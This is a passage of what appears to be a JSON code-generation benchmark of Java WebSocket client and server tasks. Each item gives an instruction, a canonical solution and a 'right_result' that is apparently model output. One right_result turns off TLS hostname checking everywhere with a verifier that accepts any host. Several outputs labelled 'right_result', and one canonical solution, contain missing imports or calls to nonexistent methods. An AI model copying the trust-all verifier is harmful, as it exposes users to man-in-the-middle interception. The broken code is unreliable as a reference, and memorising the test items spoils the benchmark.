webSocketListener.",
    "Canonical_solution": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Map;\n\nimport javax.net.ssl.SSLSocketFactory;\n\nimport org.apache.servicecomb.foundation.ssl.SSLManager;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class WebSocketTransport extends WebSocketClient {\n  public static final int CONNECT_TIMEOUT = 5000;\n\n  private final WebSocketListener webSocketListener;\n\n  public WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties,\n      Map<String, String> headers, WebSocketListener webSocketListener)\n      throws URISyntaxException {\n    super(new URI(serverUri), new Draft_6455(), headers, CONNECT_TIMEOUT);\n\n    if (sslProperties.isEnabled()) {\n      SSLSocketFactory sslSocketFactory = SSLManager\n          .createSSLSocketFactory(sslProperties.getSslOption(), sslProperties.getSslCustom());\n      URI uri = new URI(serverUri);\n      setSocketFactory(new SSLSocketFactoryExt(sslSocketFactory, uri.getHost(), uri.getPort()));\n    }\n\n    this.webSocketListener = webSocketListener;\n  }\n\n  @Override\n  public void onOpen(ServerHandshake serverHandshake) {\n    this.webSocketListener.onOpen(serverHandshake);\n  }\n\n  @Override\n  public void onMessage(String s) {\n    this.webSocketListener.onMessage(s);\n  }\n\n  @Override\n  public void onClose(int code, String reason, boolean remote) {\n    this.webSocketListener.onClose(code, reason, remote);\n  }\n\n  @Override\n  public void onError(Exception e) {\n    this.webSocketListener.onError(e);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport javax.net.ssl.HttpsURLConnection;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Map;\n\npublic class WebSocketTransport extends WebSocketClient {\n    public static final int CONNECT_TIMEOUT = 5000;\n    private WebSocketListener webSocketListener;\n\n    public WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties, Map<String, String> headers, WebSocketListener webSocketListener) throws URISyntaxException {\n        super(new URI(serverUri));\n        this.webSocketListener = webSocketListener;\n        setConnectionTimeout(CONNECT_TIMEOUT);\n        if (sslProperties != null) {\n            HttpsURLConnection.setDefaultSSLSocketFactory(sslProperties.getSSLContext().getSocketFactory());\n            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);\n        }\n        for (Map.Entry<String, String> header : headers.entrySet()) {\n            addHeader(header.getKey(), header.getValue());\n        }\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        webSocketListener.onOpen(handshakedata);\n    }\n\n    @Override\n    public void onMessage(String message) {\n        webSocketListener.onMessage(message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        webSocketListener.onClose(code, reason, remote);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        webSocketListener.onError(ex);\n    }\n}\n```"
  },
  {
    "Task_id": 465,
    "Instruction": "Task Description: Create a WebSocket client class in Java using the org.java_websocket library to establish a connection to a WebSocket server, handle incoming messages, and manage connection events.\n\nClass Description: The TestWebSocket class extends WebSocketClient to create a WebSocket client that connects to a specified localhost port. It overrides key WebSocket event-handling methods to manage connection lifecycle events, message reception, and errors.\n\nAttributes:\n- None (The class inherits all necessary attributes from WebSocketClient)\n\nMethods:\n- Constructor: TestWebSocket(int port) throws URISyntaxException - Initializes the WebSocket client with the specified port, constructing the WebSocket URI as \"ws://localhost:[port]\".\n- onOpen: onOpen(ServerHandshake handshakedata) -> void - Called when the WebSocket connection is successfully established.\n- onMessage: onMessage(String message) -> void - Called when a text message is received from the server.\n- onMessage: onMessage(ByteBuffer message) -> void - Called when a binary message is received from the server.\n- onClose: onClose(int code, String reason, boolean remote) -> void - Called when the WebSocket connection is closed.\n- onError: onError(Exception ex) -> void - Called when an error occurs on the WebSocket connection.",
    "Canonical_solution": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.nio.ByteBuffer;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class TestWebSocket extends WebSocketClient {\n\n    public TestWebSocket(int port) throws URISyntaxException {\n        super(new URI(\"ws://localhost:\" + port));\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n    }\n\n    @Override\n    public void onMessage(String message) {\n    }\n\n    @Override\n    public void onMessage(ByteBuffer message) {\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onError(Exception ex) {\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.nio.ByteBuffer;\n\npublic class TestWebSocket extends WebSocketClient {\n    public TestWebSocket(int port) throws URISyntaxException {\n        super(new URI(\"ws://localhost:\" + port));\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected to WebSocket server\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received text message: \" + message);\n    }\n\n    @Override\n    public void onMessage(ByteBuffer message) {\n        System.out.println(\"Received binary message of length: \" + message.remaining());\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed by \" + (remote ? \"remote peer\" : \"us\") + \" Code: \" + code + \" Reason: \" + reason);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        System.err.println(\"An error occurred: \" + ex.getMessage());\n    }\n}\n```"
  },
  {
    "Task_id": 466,
    "Instruction": "Task Description: Implement a WebSocket client class in Java using the org.java_websocket library to establish a WebSocket connection, handle connection events, and manage message exchange with a WebSocket server.\n\nClass Description: The MyWebSocketClient class extends WebSocketClient to create a WebSocket client that connects to a specified URI. It overrides key WebSocket event-handling methods to manage connection lifecycle events and message processing. The class uses a CountDownLatch to synchronize thread operations during connection closure.\n\nAttributes:\n- onCloseLatch: CountDownLatch - A synchronization aid that allows one or more threads to wait until a set of operations being performed in other threads completes, specifically used to signal when the WebSocket connection is closed.\n\nMethods:\n- MyWebSocketClient(URI uri, CountDownLatch latch) -> None - Constructor that initializes the WebSocket client with the server URI and a CountDownLatch for connection closure synchronization.\n- onOpen(ServerHandshake handshakedata) -> None - Callback method invoked when a WebSocket connection is successfully established.\n- onMessage(String message) -> None - Callback method invoked when a message is received from the WebSocket server.\n- onClose(int code, String reason, boolean remote) -> None - Callback method invoked when the WebSocket connection is closed, triggers the CountDownLatch.\n- onError(Exception ex) -> None - Callback method invoked when an error occurs on the WebSocket connection.",
    "Canonical_solution": "import org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketClient extends WebSocketClient {\n    private final CountDownLatch onCloseLatch;\n\n    public MyWebSocketClient(URI uri, CountDownLatch latch) {\n        super(uri);\n        onCloseLatch = latch;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        // Connection opened callback\n    }\n\n    @Override\n    public void onMessage(String message) {\n        // Message received callback\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        onCloseLatch.countDown();\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        // Error handling callback\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketClient extends WebSocketClient {\n    private final CountDownLatch onCloseLatch;\n\n    public MyWebSocketClient(URI uri, CountDownLatch latch) {\n        super(uri);\n        this.onCloseLatch = latch;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected to server\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received message: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed by \" + (remote ? \"remote peer\" : \"us\") + \" Code: \" + code + \" Reason: \" + reason);\n        onCloseLatch.countDown();\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        ex.printStackTrace();\n    }\n}\n```"
  },
  {
    "Task_id": 467,
    "Instruction": "Task Description: Implement a secure WebSocket client class in Java that supports SSL/TLS with configurable endpoint identification algorithm for secure communication.\n\nClass Description: SSLWebSocketClient is a WebSocket client implementation that extends the WebSocketClient class from org.java_websocket library. It provides SSL/TLS support with customizable endpoint identification algorithm for secure WebSocket connections. The class includes event handlers for WebSocket lifecycle events and SSL-specific error handling.\n\nAttributes:\n- endpointIdentificationAlgorithm: String - The algorithm used for endpoint identification during SSL handshake\n- onSSLError: boolean - Flag indicating whether an SSL error occurred during connection\n- onOpen: boolean - Flag indicating whether the WebSocket connection was successfully opened\n\nMethods:\n- SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm) -> None - Constructor that initializes the WebSocket client with server address, port, and endpoint identification algorithm\n- onOpen(ServerHandshake handshakedata) -> void - Callback triggered when WebSocket connection is successfully opened\n- onMessage(String message) -> void - Callback triggered when a message is received from the server\n- onClose(int code, String reason, boolean remote) -> void - Callback triggered when WebSocket connection is closed\n- onError(Exception ex) -> void - Callback triggered when an error occurs, with special handling for SSL errors\n- onSetSSLParameters(SSLParameters sslParameters) -> void - Override method to configure SSL parameters including endpoint identification algorithm",
    "Canonical_solution": "import java.net.URI;\nimport javax.net.ssl.SSLParameters;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class SSLWebSocketClient extends WebSocketClient {\n\n    private final String endpointIdentificationAlgorithm;\n    public boolean onSSLError = false;\n    public boolean onOpen = false;\n\n    public SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm)\n        throws java.net.URISyntaxException {\n        super(new URI(\"wss://\" + address + ':' + port));\n        this.endpointIdentificationAlgorithm = endpointIdentificationAlgorithm;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        this.onOpen = true;\n    }\n\n    @Override\n    public void onMessage(String message) {\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        if (ex instanceof javax.net.ssl.SSLHandshakeException) {\n            this.onSSLError = true;\n        }\n    }\n\n    @Override\n    protected void onSetSSLParameters(SSLParameters sslParameters) {\n        super.onSetSSLParameters(sslParameters);\n        if (endpointIdentificationAlgorithm != null) {\n            sslParameters.setEndpointIdentificationAlgorithm(endpointIdentificationAlgorithm);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport javax.net.ssl.TrustManagerFactory;\nimport java.net.URI;\nimport java.security.KeyStore;\n\npublic class SSLWebSocketClient extends WebSocketClient {\n    private final String endpointIdentificationAlgorithm;\n    private boolean onSSLError = false;\n    private boolean onOpen = false;\n\n    public SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm) throws Exception {\n        super(new URI(\"wss://\" + address + \":\" + port));\n        this.endpointIdentificationAlgorithm = endpointIdentificationAlgorithm;\n        SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        // Initialize key store with necessary certificates\n        TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n        trustManagerFactory.init(keyStore);\n        sslContext.init(null, trustManagerFactory.getTrustManagers(), null);\n        setSSLSocketFactory(sslContext.getSocketFactory());\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        onOpen = true;\n        System.out.println(\"Connected to server\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received message: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed by \" + (remote ? \"remote peer\" : \"us\") + \" Code: \" + code + \" Reason: \" + reason);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        if (ex instanceof SSLException) {\n            onSSLError = true;\n            System.err.println(\"SSL Error: \" + ex.getMessage());\n        } else {\n            System.err.println(\"Error: \" + ex.getMessage());\n        }\n    }\n\n    @Override\n    protected void onSetSSLParameters(SSLParameters sslParameters) {\n        super.onSetSSLParameters(sslParameters);\n        sslParameters.setEndpointIdentificationAlgorithm(endpointIdentificationAlgorithm);\n    }\n}\n```"
  },
  {
    "Task_id": 468,
    "Instruction": "Task Description: Implement a WebSocket server class in Java using the org.java_websocket library to handle client connections, messages, disconnections, and errors.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from org.java_websocket. It provides lifecycle methods for managing WebSocket connections and includes a CountDownLatch for server startup synchronization.\n\nAttributes:\n- serverLatch: CountDownLatch - Used to signal when the server has started (nullable)\n\nMethods:\n- Constructor: MyWebSocketServer(InetSocketAddress address, int decodercount, List<Draft> drafts, Collection<WebSocket> connectionscontainer) -> void - Creates a server instance with specified address, decoder count, protocol drafts, and connection container\n- Constructor: MyWebSocketServer(int port, CountDownLatch serverLatch) -> void - Creates a server instance with specified port and startup latch\n- Constructor: MyWebSocketServer(int port) -> void - Creates a server instance with specified port (no latch)\n- onOpen(WebSocket conn, ClientHandshake handshake) -> void - Called when a new client connects\n- onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Called when a client disconnects\n- onMessage(WebSocket conn, String message) -> void - Called when a message is received from a client\n- onError(WebSocket conn, Exception ex) -> void - Called when an error occurs\n- onStart() -> void - Called when the server starts successfully",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.util.Collection;\nimport java.util.List;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private CountDownLatch serverLatch = null;\n\n    public MyWebSocketServer(InetSocketAddress address, int decodercount, List<Draft> drafts,\n        Collection<WebSocket> connectionscontainer) {\n      super(address, decodercount, drafts, connectionscontainer);\n    }\n\n    public MyWebSocketServer(int port, CountDownLatch serverLatch) {\n      super(new InetSocketAddress(port));\n      this.serverLatch = serverLatch;\n    }\n\n    public MyWebSocketServer(int port) {\n      this(port, null);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n      ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n      if (serverLatch != null) {\n        serverLatch.countDown();\n      }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.util.Collection;\nimport java.util.List;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private CountDownLatch serverLatch;\n\n    public MyWebSocketServer(InetSocketAddress address, int decodercount, List<Draft> drafts, Collection<WebSocket> connectionscontainer) {\n        super(address, decodercount, drafts, connectionscontainer);\n    }\n\n    public MyWebSocketServer(int port, CountDownLatch serverLatch) {\n        super(port);\n        this.serverLatch = serverLatch;\n    }\n\n    public MyWebSocketServer(int port) {\n        super(port);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection from \" + conn.getRemoteSocketAddress().getAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed by \" + (remote ? \"remote peer\" : \"us\") + \" Code: \" + code + \" Reason: \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message from \" + conn.getRemoteSocketAddress().getAddress() + \": \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started\");\n        if (serverLatch != null) {\n            serverLatch.countDown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 469,
    "Instruction": "Task Description: Implement a WebSocket server class in Java using the org.java_websocket library to handle client connections, messages, disconnections, and errors, with synchronization support using CountDownLatch.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends WebSocketServer from org.java_websocket. It manages client connections and messages while providing synchronization points for server startup and message reception using CountDownLatch.\n\nAttributes:\ncountServerLatch: [CountDownLatch] - Synchronization aid to signal when the server has started  \ncountClientMessageLatch: [CountDownLatch] - Synchronization aid to signal when a client message is received  \n\nMethods:\nConstructor: [MyWebSocketServer](int port, CountDownLatch serverDownLatch, CountDownLatch countClientMessageLatch) -> [void] - Initializes the WebSocket server with specified port and synchronization latches  \nonOpen: [onOpen](WebSocket conn, ClientHandshake handshake) -> [void] - Callback for new client connections  \nonClose: [onClose](WebSocket conn, int code, String reason, boolean remote) -> [void] - Callback for client disconnections  \nonMessage: [onMessage](WebSocket conn, String message) -> [void] - Callback for processing received messages (decrements message latch)  \nonError: [onError](WebSocket conn, Exception ex) -> [void] - Callback for error handling (prints stack trace)  \nonStart: [onStart]() -> [void] - Callback when server starts (decrements server latch)",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final CountDownLatch countServerLatch;\n    private final CountDownLatch countClientMessageLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch,\n        CountDownLatch countClientMessageLatch) {\n        super(new InetSocketAddress(port));\n        this.countServerLatch = serverDownLatch;\n        this.countClientMessageLatch = countClientMessageLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        countClientMessageLatch.countDown();\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerLatch.countDown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n    private final CountDownLatch countServerLatch;\n    private final CountDownLatch countClientMessageLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch, CountDownLatch countClientMessageLatch) {\n        super(new InetSocketAddress(port));\n        this.countServerLatch = serverDownLatch;\n        this.countClientMessageLatch = countClientMessageLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection from \" + conn.getRemoteSocketAddress().getAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Closed connection to \" + conn.getRemoteSocketAddress().getAddress() + \" with code \" + code);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message: \" + message);\n        countClientMessageLatch.countDown();\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started\");\n        countServerLatch.countDown();\n    }\n}\n```"
  },
  {
    "Task_id": 470,
    "Instruction": "Task Description: Implement a WebSocket server class for handling real-time communication between clients, including connection management, message broadcasting, and error handling.\n\nClass Description: ChatServer is a WebSocket server implementation that extends WebSocketServer from org.java_websocket library. It manages client connections, processes incoming messages (both text and binary), broadcasts messages to all connected clients, and handles connection events and errors.\n\nAttributes:\n- (Inherited from WebSocketServer) port: int - The port number on which the server listens\n- (Inherited from WebSocketServer) address: InetSocketAddress - The network address of the server\n- (Inherited from WebSocketServer) draft: Draft_6455 - The WebSocket protocol draft being used\n\nMethods:\n- ChatServer(int port) -> None - Constructor that initializes the server with specified port\n- ChatServer(InetSocketAddress address) -> None - Constructor that initializes the server with specified socket address\n- ChatServer(int port, Draft_6455 draft) -> None - Constructor that initializes the server with specified port and protocol draft\n- onOpen(WebSocket conn, ClientHandshake handshake) -> void - Handles new client connections, sends welcome message, and notifies other clients\n- onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Handles client disconnections and notifies other clients\n- onMessage(WebSocket conn, String message) -> void - Processes incoming text messages and broadcasts to all clients\n- onMessage(WebSocket conn, ByteBuffer message) -> void - Processes incoming binary messages and broadcasts to all clients\n- onError(WebSocket conn, Exception ex) -> void - Handles errors that occur during WebSocket operations\n- onStart() -> void - Initializes server settings when the server starts",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.util.Collections;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class ChatServer extends WebSocketServer {\n\n    public ChatServer(int port) {\n        super(new InetSocketAddress(port));\n    }\n\n    public ChatServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    public ChatServer(int port, Draft_6455 draft) {\n        super(new InetSocketAddress(port), Collections.<Draft>singletonList(draft));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        conn.send(\"Welcome to the server!\");\n        broadcast(\"new connection: \" + handshake.getResourceDescriptor());\n        System.out.println(conn.getRemoteSocketAddress().getAddress().getHostAddress() + \" entered the room!\");\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        broadcast(conn + \" has left the room!\");\n        System.out.println(conn + \" has left the room!\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        broadcast(message);\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        broadcast(message.array());\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n        setConnectionLostTimeout(100);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.util.Set;\nimport java.util.concurrent.CopyOnWriteArraySet;\n\npublic class ChatServer extends WebSocketServer {\n    private Set<WebSocket> clients = new CopyOnWriteArraySet<>();\n\n    public ChatServer(int port) {\n        super(port);\n    }\n\n    public ChatServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    public ChatServer(int port, Draft_6455 draft) {\n        super(port, draft);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        clients.add(conn);\n        broadcast(\"Welcome to the chat!\");\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        clients.remove(conn);\n        broadcast(\"A user has left.\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        broadcast(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        // Handle binary message if needed\n        broadcast(\"Binary message received.\");\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Chat Server started on port \" + getPort());\n    }\n\n    private void broadcast(String message) {\n        for (WebSocket client : clients) {\n            try {\n                client.send(message);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 471,
    "Instruction": "Task Description: Create a WebSocket server implementation using org.java_websocket library to handle client connections, messages, disconnections, and errors.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from org.java_websocket. It provides lifecycle methods for managing client connections and communication.\n\nAttributes:\n- inherited from WebSocketServer: Various internal attributes for managing server state and connections\n\nMethods:\n- Constructor: MyWebSocketServer(InetSocketAddress inetSocketAddress) -> void - Initializes the server with specified socket address\n- onOpen: onOpen(WebSocket conn, ClientHandshake handshake) -> void - Called when a new client connects\n- onClose: onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Called when a client disconnects\n- onMessage: onMessage(WebSocket conn, String message) -> void - Called when a message is received from a client\n- onError: onError(WebSocket conn, Exception ex) -> void - Called when an error occurs\n- onStart: onStart() -> void - Called when the server starts successfully",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    public MyWebSocketServer(InetSocketAddress inetSocketAddress) {\n        super(inetSocketAddress);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new client connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Process received message from client\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle errors\n    }\n\n    @Override\n    public void onStart() {\n        // Server startup logic\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    public MyWebSocketServer(InetSocketAddress inetSocketAddress) {\n        super(inetSocketAddress);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection from \" + conn.getRemoteSocketAddress().getAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed by \" + (remote ? \"remote peer\" : \"us\") + \" Code: \" + code + \" Reason: \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message from \" + conn.getRemoteSocketAddress().getAddress() + \": \" + message);\n        conn.send(\"Echo: \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started\");\n    }\n}\n```"
  },
  {
    "Task_id": 472,
    "Instruction": "Task Description: Implement a WebSocket server using the org.java_websocket library to handle client connections, messages, disconnections, and errors.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from the org.java_websocket library. It provides lifecycle methods for managing client connections and communication.\n\nAttributes:\n- countServerLatch: CountDownLatch - A synchronization aid that allows one or more threads to wait until a set of operations being performed in other threads completes.\n\nMethods:\n- MyWebSocketServer(int port, CountDownLatch serverDownLatch) -> None - Constructor that initializes the WebSocket server with the specified port and CountDownLatch.\n- onOpen(WebSocket conn, ClientHandshake handshake) -> None - Called when a new client connection is established.\n- onClose(WebSocket conn, int code, String reason, boolean remote) -> None - Called when a client connection is closed.\n- onMessage(WebSocket conn, String message) -> None - Called when a message is received from a client.\n- onError(WebSocket conn, Exception ex) -> None - Called when an error occurs.\n- onStart() -> None - Called when the server starts successfully.",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final CountDownLatch countServerLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch) {\n        super(new InetSocketAddress(port));\n        this.countServerLatch = serverDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new client connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Process received message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle errors\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        // Server startup complete\n        countServerLatch.countDown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
